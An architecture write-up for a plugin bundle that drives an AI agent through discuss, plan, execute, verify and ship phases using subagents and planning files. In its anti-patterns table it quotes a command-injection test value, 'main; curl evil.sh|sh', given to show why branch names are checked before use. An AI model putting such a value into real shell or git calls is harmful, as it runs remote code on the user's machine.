<!-- refreshed: 2026-08-23 -->
# Architecture

**Analysis Date:** 2026-08-23

`@dsh-gsd/bundle` is a DeepSeek Harness **bundle** — a set of host-plane Cordis
plugins packaged as subpath exports of one ESM package — that reimplements
[opengsd-core](https://github.com/open-gsd/gsd-core) (Git Ship Done) and
**replaces the default agent-loop behaviour** with the GSD phase loop:

```
Discuss → (UI design, optional) → Plan → Execute → Verify → Ship
```

It is NOT a standalone application. It runs **inside a DeepSeek Harness (DSH)
session** (the host runtime). The mechanical turn machine in
`@deepseek-ai/dsh-agent-loop` (tool scheduling, context assembly, session
prep) stays — that is DSH's core. This bundle replaces the agent loop's
*behaviour*: the persona every session reads, the runtime context that
orients each step, and the `gsd_*` phase tools that drive the loop.

## System Overview

```
                      DeepSeek Harness (host) session
 ┌──────────────────────────────────────────────────────────────────────┐
 │  cordis.patch.yml (cordis.patch.yml)                                  │
 │   ├─ override row agent-loop → config.agents: [{ id: gsd }]           │
 │   └─ insert rows: gsd-persona, gsd-state, gsd-core-tools,            │
 │       gsd-discuss, gsd-plan, gsd-execute, gsd-verify, gsd-ship,        │
 │       gsd-ui, gsd-quick, gsd-map-codebase, gsd-commands                │
 │                                                                       │
 │  host Cordis context (ctx):                                           │
 │   services → systemPrompt, tools, commands, fs, subagents             │
 │   DI       → ctx.get / ctx.provide / ctx.effect / ctx.inject            │
 │                                                                       │
 │  ┌───────────── gsd-persona (lib/persona.js) ──────────────┐         │
 │  │ systemPrompt.section("gsd:persona", order -100, text)     │         │
 │  │ systemPrompt.context("gsd:state", order 10, provider)     │         │
 │  │   provider reads gsdState.cachedState(cwd) sync            │         │
 │  └────────────────────────────┬───────────────────────────┘         │
 │                               │ ctx.get("gsdState")                  │
 │  ┌──────────── gsd-state (lib/state.js) ────────────────┐            │
 │  │ class GsdState — published as ctx.provide("gsdState") │            │
 │  │ reads/writes `.planning/` artefacts via ctx.fs         │            │
 │  │ in-memory cache _cache: cwd → {state, roadmap, ts}     │            │
 │  └────────────────────────────┬───────────────────────────┘            │
 │                               │ every phase tool calls ctx.get("gsdState")
 │  ┌─────── phase tools (lib/{core-tools,discuss,plan,execute,verify,   │
 │  │        ship,ui,quick,map-codebase}.js) ──────────────────────────  │
 │  │  ctx.tools.register(defineTool({name:"gsd_*", execute}))           │
 │  │  spawn fresh-context subagents via ctx.get("subagents").start(...) │
 │  │  helpers: lib/_runner.js (spawnSubagent, planningContext, cwdOf)   │
 │  │           lib/_agents.js (role prompts: RESEARCHER/PLANNER/...)     │
 │  │           lib/_shared.js (frontmatter, roadmap, slug helpers)      │
 │  └──────────────────────────────────────────────────────────────────  │
 │                                                                       │
 │  ┌──── gsd-commands (lib/commands.js) ──────┐                         │
 │  │ ctx.commands.register("/gsd-*")           │                         │
 │  │ thin routers → inject user msg → agent    │                         │
 │  │ runs the matching gsd_* tool              │                         │
 │  └───────────────────────────────────────────┘                         │
 └──────────────────────────────────────────────────────────────────────┘
                │ spawns (fresh-context, in-process `spawn` provider)
                ▼
   fresh-context subagents (researcher, planner, plan-checker,
     executor, verifier, ui-researcher, ui-checker, codebase-mapper)
        each gets a <planning_context> block + role prompt,
        writes artefacts directly to `.planning/`, returns a short result.
```

The orchestrator principle: **the main session stays lean**. Phase tools
gather inputs from `.planning/`, build a `<planning_context>` block, spawn a
one-shot fresh-context subagent for the heavy work, then read back the
artefact the subagent wrote and route to the next step. Phase tools never do
the research/planning/executing/verifying themselves.

## Component Responsibilities

| Component | File(s) | Responsibility |
|---|---|---|
| Persona | `lib/persona.js` | Install the GSD phase-loop system-prompt section (`gsd:persona`, order -100) and the `gsd:state` runtime-context provider that orients every model step at the current `STATE.md` position. |
| State service | `lib/state.js` | The `gsdState` host service: read/write `.planning/` artefacts (PROJECT/REQUIREMENTS/ROADMAP/STATE/config + per-phase CONTEXT/RESEARCH/PLAN/SUMMARY/VERIFICATION/UI-SPEC), plan indexing, progress counters, in-memory sync cache. |
| Core tools | `lib/core-tools.js` | `gsd_init`, `gsd_status`, `gsd_progress`, `gsd_new_milestone` — orientation + bootstrap, backed by `gsdState`. |
| Discuss | `lib/discuss.js` | `gsd_discuss` — seal `CONTEXT.md` (7 blocks, D-NN decisions) + DISCUSSION-LOG, advance STATE to `plan`. |
| Plan | `lib/plan.js` | `gsd_plan` — orchestrates researcher → planner → plan-checker (3-iteration revision loop), writes RESEARCH.md + PLAN.md files, advances STATE to `execute`. |
| Execute | `lib/execute.js` | `gsd_execute` — wave-based fresh-context executors, one PLAN.md each, atomic per-task commits, SUMMARY.md, advances STATE to `verify`. |
| Verify | `lib/verify.js` | `gsd_verify` — spawns verifier, reads VERIFICATION.md status, routes passed/gaps_found/human_needed. |
| Ship | `lib/ship.js` | `gsd_ship` — preflight gates (verification passed, clean tree, feature branch, remote, `gh`), push, `gh pr create`, `completePhase`. |
| UI design | `lib/ui.js` | `gsd_ui_phase` (optional) — ui-researcher → UI-SPEC.md, ui-checker verifies. |
| Quick | `lib/quick.js` | `gsd_quick` — sub-threshold lightweight path: one fresh-context subagent + `.planning/quick/<date>-<slug>/TASK.md`. |
| Codebase mapper | `lib/map-codebase.js` | `gsd_map_codebase` — parallel fresh-context mappers write 7 docs to `.planning/codebase/`. Brownfield pre-init tool. |
| Commands | `lib/commands.js` | `/gsd-*` slash-commands: thin routers that inject a user message instructing the agent to run the matching `gsd_*` tool. |
| Subagent runner | `lib/_runner.js` | `spawnSubagent` (host `subagents` `spawn` provider), `planningContext` (truncate-large-artefact context block), `cwdOf`. |
| Role prompts | `lib/_agents.js` | The meta-prompts for each fresh-context role (RESEARCHER/PLANNER/PLAN_CHECKER/EXECUTOR/VERIFIER/UI_RESEARCHER/UI_CHECKER/CODEBASE_MAPPER). |
| Shared helpers | `lib/_shared.js` | YAML-subset frontmatter parse/stringify, ROADMAP/REQUIREMENTS parse/stringify, slug/date helpers, `matchesGapClosure`/`isValidRef`/`isClosedPhase` decision predicates. |
| Plugin manifest | `cordis.patch.yml` | The bundle patch: overrides the `agent-loop` row config and inserts the GSD plugin rows. |
| Package manifest | `package.json` | Defines the subpath exports (`@dsh-gsd/bundle/<name>`), `files`, peer dependencies on the host packages. |

## Pattern Overview

**Overall:** Orchestrator-on-host. Every plugin is a standard DSH/Cordis plugin
(`export { name, inject, apply }`). `apply(ctx, config)` registers its
contribution (a tool, a system-prompt section, a host service, or slash
commands) against host-provided context services. The bundle replaces the
agent-loop *behaviour* — not the turn machine.

**Key characteristics:**

- **Host-service dependency injection.** Each plugin declares `inject`
  (`lib/<plugin>.js` top) — the host services it needs:
  `persona.js` injects `["systemPrompt"]`; `state.js` injects `["fs"]`;
  every phase tool injects `["gsdState", "tools"]`; `commands.js` injects
  `["commands"]`. `inject` is resolved by Cordis before `apply` runs.
- **The `gsdState` service is the shared backbone.** `lib/state.js` publishes
  it via `ctx.provide("gsdState", svc)` (`lib/state.js:515`). All phase tools
  reach it through `ctx.get("gsdState")` (the closure `const gsd = () =>
  ctx.get("gsdState")` idiom at the top of each `apply`).
- **`defineTool` is the only tool-definition API.** Every model-facing tool is
  registered as `ctx.tools.register(defineTool({ name, description,
  parameters, output, execute, presentCall }))` (`defineTool` from
  `@deepseek-ai/dsh-tools`, `node_modules/@deepseek-ai/dsh-tools/lib/index.js:836`).
  `parameters` use the dsh-tools value-spec (not raw JSON Schema);
  `defineTool` compiles them and validates args before `execute` runs.
- **Fresh-context subagents for heavy work.** The orchestrator (`lib/plan.js`,
  `lib/execute.js`, `lib/verify.js`, `lib/ui.js`, `lib/quick.js`,
  `lib/map-codebase.js`) spawns one-shot fresh-context children through the
  host `subagents` service's in-process `spawn` provider
  (`lib/_runner.js:8-32`). Subagents get a `<planning_context>` block
  (`lib/_runner.js:36-46`) + a role prompt from `lib/_agents.js`, then write
  artefacts directly to `.planning/` and return a short confirmation.
- **`.planning/` is the durable memory.** Artefact schemas (frontmatter +
  body) are faithful to opengsd-core. STATE.md is the navigation spine.
- **Synchronous persona, asynchronous tools.** The persona's runtime-context
  provider needs a *sync* snapshot, so `GsdState` keeps an in-memory
  `_cache` (`lib/state.js:37`, `cachedState` at `lib/state.js:496-507`)
  updated on every artefact write; the phase tools' `execute` paths are async
  and use the real `ctx.fs`.

## Layers

The bundle is a single `lib/` directory; "layers" are roles, not folders.

| Layer | Purpose | Location | Contains | Depends on | Used by |
|---|---|---|---|---|---|
| **Manifest / wiring** | Declare the plugin rows and override the agent-loop config | `cordis.patch.yml`, `package.json` | plugin row ids + subpath export names | host Cordis loader | the host session boot |
| **Persona / system prompt** | Frame every session as a GSD phase-loop driver | `lib/persona.js` | `PERSONA_TEXT`, `renderStateContext`, `apply` | `ctx.systemPrompt`, `gsdState` | the model (every turn) |
| **Host services** | Publish services consumed by tools | `lib/state.js` | `class GsdState` | `ctx.fs` | every phase tool, persona |
| **Model-facing tools** | One phase step each, callable by the model | `lib/core-tools.js`, `lib/discuss.js`, `lib/plan.js`, `lib/execute.js`, `lib/verify.js`, `lib/ship.js`, `lib/ui.js`, `lib/quick.js`, `lib/map-codebase.js` | `defineTool(...)` registrations | `gsdState`, `tools`, `subagents` (most), `ctx.fs` (indirect) | the model (via tool calls), `/gsd-*` commands |
| **Slash-commands** | opengsd UX: thin routers to tools | `lib/commands.js` | `COMMANDS` table, `apply` | `ctx.commands`, `@deepseek-ai/dsh-llm` (`createUserMessage`) | the user (chat input) |
| **Orchestration helpers** | Spawn subagents, build context blocks | `lib/_runner.js` | `spawnSubagent`, `planningContext`, `cwdOf` | `ctx.get("subagents")`, `_shared` | the phase tools |
| **Role prompts** | Meta-prompts for each fresh-context role | `lib/_agents.js` | `RESEARCHER_PROMPT`, `PLANNER_PROMPT`, `PLAN_CHECKER_PROMPT`, `EXECUTOR_PROMPT`, `VERIFIER_PROMPT`, `UI_RESEARCHER_PROMPT`, `UI_CHECKER_PROMPT`, `CODEBASE_MAPPER_PROMPT` | none (pure string consts) | the phase tools |
| **Pure helpers** | Frontmatter/roadmap/slug/decision predicates | `lib/_shared.js` | `parseFrontmatter`, `stringifyFrontmatter`, `parseRoadmap`, `parseRequirements`, `slugify`, `zeroPad`, `matchesGapClosure`, `isValidRef`, `isClosedPhase` | none | `state.js`, every phase tool |
| **Tests** | Deterministic regression cover for helpers + state + tools | `test/*.test.mjs`, `test/helpers/*.mjs` | `node:test` suites + in-memory fake host `fs`/`subagents` | the `lib/` modules under test | the test runner |

Dependency direction is strictly downward: manifest → persona/services →
tools → orchestration helpers / role prompts → pure helpers. No `lib/` module
imports a phase tool; phase tools import `state.js`, `_runner.js`, `_agents.js`,
`_shared.js`. `_shared.js` imports nothing. This keeps the core (state,
helpers) unit-testable with no host.

## Data Flow

### Primary request path — `gsd_plan` (the canonical orchestration flow)

The model is a GSD driver (via `gsd:persona`). It calls `gsd_plan` (tool call)
with `phase: N`. The tool's `execute` (`lib/plan.js:35-156`) runs:

1. **Orient.** `cwdOf(exec)` (`lib/_runner.js:48`) → `cwd`. `ctx.get("gsdState")`
   (`lib/plan.js:19`). Guard: `s.isProject(cwd)` (`lib/state.js:103`); reject if
   no `.planning/`.
2. **Resolve phase.** `s.readRoadmap(cwd)` (`lib/state.js:310`) → find the
   phase by `args.phase` (`lib/plan.js:41`). Reject if absent. Compute
   `phaseDir` + `base` (`lib/plan.js:43-44`).
3. **Closed-phase gate.** If a VERIFICATION.md exists and `isClosedPhase(v)`
   (`lib/_shared.js:292`) is true, reject unless `args.force`
   (`lib/plan.js:49-52`).
4. **CONTEXT.md guard.** Reject if no CONTEXT.md — discuss first
   (`lib/plan.js:54-55`).
5. **Load context.** `s.readProject`, `s.readRequirements`, `s.readArtifact(
   CONTEXT)` (`lib/plan.js:57-60`).
6. **Set step.** `s.setActivePhase(cwd, phase, "plan")` (`lib/state.js:291`)
   writes STATE.md.
7. **Research** (`lib/plan.js:67-87`). If no RESEARCH.md (or `forceResearch`),
   build the researcher prompt = `RESEARCHER_PROMPT` (`lib/_agents.js:8`) +
   `planningContext([...])` (`lib/_runner.js:36`) + output path hint, then
   `spawnSubagent(ctx, exec, { label, promptText })` (`lib/_runner.js:8`).
   Save the returned `r.output` via `s.writeArtifact(..., "RESEARCH", ...)`
   (`lib/state.js:370`).
8. **Plan** (`lib/plan.js:89-113`). Build the planner prompt
   (`PLANNER_PROMPT` + `planningContext` + mode flags). Spawn the planner.
   If it returns `## PHASE SPLIT RECOMMENDED`, surface that and stop.
9. **Verify (revision loop, max 3)** (`lib/plan.js:115-132`). `runChecker`
   spawns `PLAN_CHECKER_PROMPT`; if it does NOT return
   `## VERIFICATION PASSED`, re-spawn the planner with the checker's issues
   and re-run the checker, up to 3 iterations.
10. **Requirements coverage gate** (`lib/plan.js:134-139`). Cross-check every
    phase REQ-ID is covered by ≥1 plan's `requirements` frontmatter.
11. **Advance STATE.** `setStep("execute")` + `s.addDecision(...)`
    (`lib/state.js:265`). Return the wave plan + any uncovered requirements.

The same orchestrator shape (orient → guard → load context → spawn → read
back artefact → route) repeats in `gsd_execute` (`lib/execute.js:34-134`),
`gsd_verify` (`lib/verify.js:28-99`), `gsd_ui_phase` (`lib/ui.js:24-67`), and
`gsd_map_codebase` (`lib/map-codebase.js:82-201`). `gsd_ship`
(`lib/ship.js:44-145`) is the exception: it does not spawn a subagent; it runs
preflight gates against git/gh via `node:child_process.execFileSync`
(`lib/ship.js:19-30`) and calls `gh pr create`.

### State management

- **Durable state lives on disk under `.planning/`.** Schema:
  `PROJECT.md`, `REQUIREMENTS.md`, `ROADMAP.md`, `STATE.md`, `config.json`,
  `phases/<NN>-<slug>/<NN>-CONTEXT.md`, `<NN>-RESEARCH.md`,
  `<NN>-<PP>-PLAN.md`, `<NN>-<PP>-SUMMARY.md`, `<NN>-VERIFICATION.md`,
  `<NN>-UI-SPEC.md`, plus `quick/<date>-<slug>/TASK.md` and `codebase/*.md`.
  See `README.md` § ".planning/ artefacts".
- **STATE.md is the navigation spine** — YAML frontmatter (machine: `status`,
  `active_phase`, `next_action`, `progress`, session-continuity fields) +
  Markdown body (human: position, decisions, blockers, continuity). Round-trips
  through `parseFrontmatter` + `_parseStateBody` (`lib/state.js:230-249`) and
  `_stringifyState` (`lib/state.js:193-219`).
- **The roadmap is the single source of truth for phase progress.**
  `recomputeProgress` (`lib/state.js:484-493`) and `completePhase`
  (`lib/state.js:464-481`) recompute `progress.completed_phases` / `percent`
  from `parseRoadmap`, never from a counter — fixing the drift bugs pinned in
  `test/state.test.mjs`.
- **In-memory cache for sync reads.** `GsdState._cache` (`lib/state.js:37`)
  maps `cwd → { state, roadmap, ts }`. It is refreshed on every `readState`
  and `writeState` so `cachedState` (`lib/state.js:496-507`) — called
  synchronously by the persona context provider — never blocks on `ctx.fs`.
  Cleared on plugin teardown (`lib/state.js:516`).

## Key Abstractions

| Abstraction | Purpose | Examples | Pattern |
|---|---|---|---|
| **DSH plugin module** | The unit of host integration | `lib/persona.js`, `lib/state.js`, every `lib/<phase>.js` | `export { name, inject, apply }`. `inject` lists required host services; `apply(ctx, config)` registers. |
| **Host service (`gsdState`)** | Cross-plugin shared state + artefact IO | `lib/state.js` `class GsdState` | Published via `ctx.provide("gsdState", svc)`; consumed via `ctx.get("gsdState")`. Not a Cordis `Service` subclass — a plain object. |
| **Model-facing tool** | One phase step callable by the model | `gsd_init`, `gsd_discuss`, `gsd_plan`, `gsd_execute`, `gsd_verify`, `gsd_ship`, `gsd_ui_phase`, `gsd_quick`, `gsd_map_codebase`, `gsd_status`, `gsd_progress`, `gsd_new_milestone` | `defineTool({ name, description, parameters, output, execute, presentCall })` → `ctx.tools.register(...)`. Args are validated by `defineTool` before `execute`. |
| **Fresh-context subagent role** | One-shot clean-context worker | `RESEARCHER_PROMPT`, `PLANNER_PROMPT`, `PLAN_CHECKER_PROMPT`, `EXECUTOR_PROMPT`, `VERIFIER_PROMPT`, `UI_RESEARCHER_PROMPT`, `UI_CHECKER_PROMPT`, `CODEBASE_MAPPER_PROMPT` (`lib/_agents.js`) | Meta-prompt string consts. The orchestrator prepends a `<planning_context>` block before spawning. Roles own their artefact writes; the orchestrator only collects confirmations. |
| **`.planning/` artefact** | Durable, schema-faithful record | `STATE.md`, `<NN>-CONTEXT.md`, `<NN>-<PP>-PLAN.md`, `<NN>-VERIFICATION.md` | YAML frontmatter (machine) + Markdown body (human). Parsed by the subset parser in `_shared.js`, tolerant of both fenced (`---`) and fenceless frontmatter. |
| **Slash-command router** | opengsd UX entry point | `/gsd-plan-phase 1`, `/gsd-ship 2 --draft` (`lib/commands.js` `COMMANDS`) | `build(rawInput)` → `{ text, ack }` or `{ err }`. `send(agent, text)` injects a `createUserMessage` followup; returns a short ack. The agent (already a GSD driver) then runs the matching tool. |
| **Decision predicate** | Pure safety/branching guard | `matchesGapClosure`, `isValidRef`, `isClosedPhase` (`lib/_shared.js:278-295`) | Pure functions, unit-tested in `test/_shared.test.mjs`. Guards: `--gaps-only` filtering, base-branch shell-injection prevention, replan gate. |

## Entry Points

| Entry point | Location | Trigger | Responsibility |
|---|---|---|---|
| **Package main / `@dsh-gsd/bundle`** | `lib/persona.js` (`package.json` `main` + `exports["."]`) | Host Cordis loader resolves the plugin row `name: '@dsh-gsd/bundle/persona'` | Install the persona + runtime context. |
| **`@dsh-gsd/bundle/state`** | `lib/state.js` | Plugin row `gsd-state` | Publish `gsdState`. |
| **`@dsh-gsd/bundle/<phase>`** | `lib/{core-tools,discuss,plan,execute,verify,ship,ui,quick,map-codebase,commands}.js` | The matching `cordis.patch.yml` insert row | Register the phase tool(s) / commands. |
| **`cordis.patch.yml`** | repo root | `dsh plugin add` applies it after `dsh-base` | Override `agent-loop.config` to configure the `gsd` agent; insert the GSD plugin rows. Last-write-wins per row. |
| **`gsd_init` tool** | `lib/core-tools.js:16-80` | Model tool call (or `/gsd-init`) | Bootstrap a project: write `.planning/PROJECT.md`, `REQUIREMENTS.md`, `ROADMAP.md`, `STATE.md`, `config.json`. |
| **`gsd_status` tool** | `lib/core-tools.js:83-118` | Model tool call (or `/gsd-status`) | Read STATE.md + ROADMAP.md, render the loop position. |
| **`/gsd-*` commands** | `lib/commands.js:174-189` | User types a slash command in chat | Inject a user-message followup instructing the agent to run the matching tool; return an ack. |

## Architectural Constraints

- **No runtime dependencies.** `package.json` declares `"dependencies": {}`.
  All host interaction is through peer dependencies (`@deepseek-ai/dsh-tools`,
  `@deepseek-ai/schemastery`, `@deepseek-ai/cordis`, `@deepseek-ai/dsh-llm`)
  and Node built-ins (`node:child_process`, `node:fs/promises`). The bundle is
  shippable as-is; the host provides the runtime.
- **Plugin contract is fixed.** Every plugin module MUST `export { name,
  inject, apply }` with `name` matching the `cordis.patch.yml` row id and
  `inject` listing every host service `apply` uses. Adding a new plugin means
  adding a row in `cordis.patch.yml` and a subpath export in `package.json`.
- **`gsdState` is the only cross-plugin shared service.** Phase tools MUST NOT
  reach for host services directly except through their declared `inject`.
  The closure idiom `const gsd = () => ctx.get("gsdState")` defers resolution
  to call time (the service is registered by `gsd-state`, which activates in
  its own row; `inject` only guarantees availability before `apply` runs, not
  before a tool's later `execute`).
- **`subagents` is required for plan/execute/verify/ui/quick/map-codebase.**
  `spawnSubagent` throws a clear error if the `spawn` provider is missing
  (`lib/_runner.js:10-12`). `gsd_discuss` and `gsd_core-tools` do NOT need it —
  they are pure artefact IO.
- **Shared working tree, not per-plan worktrees.** Executors run on the
  current branch (`lib/execute.js` comment, lines 9-12). The plan-checker's
  same-wave non-overlap guarantee (Dimension 3 in `PLAN_CHECKER_PROMPT`) is
  what makes the shared tree safe. Per-plan git worktrees are deliberately
  omitted (a harness-worktree feature), per `README.md` § Faithfulness.
- **No global mutable state across cwd.** `GsdState._cache` is keyed by `cwd`
  and cleared on teardown. Tools resolve `cwd` from `exec.agent.session.header.cwd`
  (`cwdOf`, `lib/_runner.js:48`) with a `process.cwd()` fallback — never from
  a module-level constant.
- **Shell calls are validated-ref only.** `gsd_ship` and `gsd_map_codebase`
  pass branch/path values into `execFileSync` only after `isValidRef`
  (`lib/_shared.js:286`) / `validatePaths` (`lib/map-codebase.js:47`) guards
  — preventing command injection (`test/_shared.test.mjs` pins this).
- **No circular imports.** Dependency graph is acyclic and downward:
  `persona` → `state`/`_shared`; phase tools → `state`/`_runner`/`_agents`/
  `_shared`; `_runner` → `_shared`; `_agents` → none; `_shared` → none.

## Anti-Patterns

| What | Why wrong | Do this instead |
|---|---|---|
| Importing a phase tool from another phase tool | Couples loop steps; breaks the orchestrator-only-downward rule | Share logic via `lib/_shared.js` (pure) or `lib/_runner.js` (orchestration). Add a new exported helper there if needed. |
| Reaching for `ctx.fs` / `ctx.subagents` from a plugin that did not declare them in `inject` | Violates the plugin contract; the service may not be wired | Declare the service in `inject` (e.g. `const inject = ["gsdState", "tools"]`). |
| Calling `ctx.get("gsdState")` at `apply` time and storing the reference | `gsd-state` may not have activated yet; a stored reference can go stale across plugin lifecycles | Use the closure `const gsd = () => ctx.get("gsdState")` and resolve at `execute` time (the pattern every phase tool uses). |
| Parsing PLAN/SUMMARY/VERIFICATION frontmatter with a general YAML library | Subagents sometimes omit the `---` fences; a strict parser returns `{}` and silently drops requirements/wave/status — the bugs pinned in `test/_shared.test.mjs` and `test/state.test.mjs` | Use `parseFrontmatter` from `lib/_shared.js`, which handles both fenced and fenceless frontmatter + one level of nesting. |
| Comparing `gap_closure === "true"` | `coerceScalar` parses unquoted `gap_closure: true` as a boolean, so the string compare never matches and `--gaps-only` runs nothing (pinned bug) | Use `matchesGapClosure(value)` (`lib/_shared.js:278`), which accepts `true`, `"true"`, `"True"`. |
| Interpolating user/model branch names into git/gh CLI strings | Command injection (`test/_shared.test.mjs` pins `main; curl evil.sh\|sh`) | Validate with `isValidRef` (`lib/_shared.js:286`) before passing to `execFileSync`. Use `execFileSync` (argv form), never `execSync` with a shell string. |
| Letting `total_plans` / `completed_plans` / `percent` drift from the roadmap | Status reports "X/0 plans" or wrong percentages (pinned bugs) | Always recompute via `recomputeProgress` / `completePhase`, which read the roadmap as the single source of truth. |
| Running the full test suite from the orchestrator between waves | The orchestrator stays lean; the per-task `<verify>` is the gate | Leave regression to each executor's own `<verify>` (the `gsd_execute` post-wave comment at `lib/execute.js:119-121` documents this deliberately). |
| A subagent committing VERIFICATION.md | The orchestrator bundles phase artefacts; a verifier committing can race the ship preflight's clean-tree gate | The `VERIFIER_PROMPT` explicitly says "DO NOT commit VERIFICATION.md — the orchestrator bundles it" (`lib/_agents.js`). |

## Error Handling

**Strategy: fail loud, fail early, with a recoverable message.** The bundle
prefers throwing a precise `Error` over silently returning empty, because the
GSD loop's guards (discuss-before-plan, plan-before-execute, verify-before-ship)
depend on the next step seeing a real failure.

**Patterns:**

- **Tool-entry guards throw.** Every tool's `execute` begins with a guard
  chain: `gsdState` present? project exists? phase in roadmap? subagents
  present? Each throws a message naming the tool and the missing prerequisite
  (e.g. `gsd_plan: no .planning/ project — run gsd_init first`,
  `lib/plan.js:39`). The model reads these and routes to the right prior step.
- **Closed-phase / status gates throw with the bypass hint.**
  `gsd_plan` on a passed phase throws
  `… already passed verification. Re-run with force=true to replan …`
  (`lib/plan.js:51`). `gsd_ship` preflight `fail(msg)` throws
  `gsd_ship preflight failed: <msg>` (`lib/ship.js:53`).
- **`defineTool` validates args before `execute`.** `parameterSchemaSpecToJsonSchema`
  + `validateJsonSchemaValue` reject bad args as `ToolArgsError`
  (`node_modules/@deepseek-ai/dsh-tools/lib/index.js:862-865`). The model gets
  a structured violation, not a runtime crash.
- **Best-effort IO swallows expected absences.** `s.readArtifact(...).catch(() => "")`
  is used where an absent artefact is a normal state (e.g. optional RESEARCH.md,
  UAT.md) — `lib/plan.js:90-91`, `lib/verify.js:44-46`. Absence of a *required*
  artefact is then caught by an explicit guard (`if (!verText) fail(...)`).
- **Subagent failure surfaces, not swallowed.** `spawnSubagent` returns
  `{ output, stopReason, diagnostic }`; callers check for empty/short output
  and return a message with the `stopReason` (e.g. `lib/plan.js:81`,
  `lib/ui.js:50`). The map orchestrator reports missing/thin documents
  explicitly (`lib/map-codebase.js:165-175`).
- **Pure predicates never throw on bad input.** `isClosedPhase(undefined)`,
  `isValidRef("")`, `matchesGapClosure(null)` all return `false`
  (`test/_shared.test.mjs`); they are guards, not parsers.
- **No try/catch around the happy path.** The bundle does not wrap routine
  logic in catch-all blocks; failures propagate to the tool runtime, which
  reports them to the model. The only broad `try/catch` blocks are around
  optional best-effort IO and the persona context provider (`lib/persona.js:85`
  returns `""` on any throw so a state-read error never breaks the session).

## Cross-Cutting Concerns

- **Logging / observability:** Not applicable. The bundle emits no logs; every
  tool returns a human-readable Markdown string (its tool result) that the
  model relays. The "log" is the returned string + the `STATE.md` decision
  lines appended via `s.addDecision` (`lib/state.js:265`). Subagent outputs are
  truncated to ~120-500 chars in orchestrator returns to keep the session lean
  (e.g. `lib/execute.js:115`, `lib/verify.js:96`).
- **Validation:** Three layers. (1) `defineTool` arg validation (schema).
  (2) Tool-entry guards (project/phase/service presence). (3) Pure predicates
  for security-sensitive values (`isValidRef`, `validatePaths`,
  `matchesGapClosure`, `isClosedPhase`). Frontmatter is parsed by the tolerant
  subset parser, not a strict schema — faithfulness to what subagents actually
  write matters more than schema purity.
- **Authentication / secrets:** Not applicable to the bundle itself. `gsd_ship`
  delegates GitHub auth to the `gh` CLI (`gh auth status` preflight,
  `lib/ship.js:77`). The codebase mapper's forbidden-secrets rule
  (`CODEBASE_MAPPER_PROMPT`) prevents secret leakage into committed map docs.
  No `.env`/credentials are read by any module.
- **Configuration:** `.planning/config.json` (`lib/state.js:143-161`,
  `_defaultConfig`) holds workflow flags (`tdd_mode`, `mvp_mode`,
  `use_worktrees`, `commit_docs`, `context_window`, `project_code`). Read via
  `s.readConfig`; written once at `gsd_init`. Host-side config is the
  `cordis.patch.yml` row config (agent-loop override + plugin rows).
- **Committing:** Executors commit atomically per task (conventional-commit
  `{phase}-{plan}` scope) inside the subagent. The orchestrator commits the
  codebase map (`gitAddCommit`, `lib/map-codebase.js:59`) and the ship step
  pushes the branch. Phase artefact commits are best-effort and never block
  the loop.
- **Concurrency:** Same-wave executors run in parallel via `Promise.all`
  (`lib/execute.js:80-101`). The plan-checker's non-overlap guarantee makes
  this safe. `maxParallelToolCalls: 10` is set in the agent-loop override
  (`cordis.patch.yml:26`).

*Architecture analysis: 2026-08-23*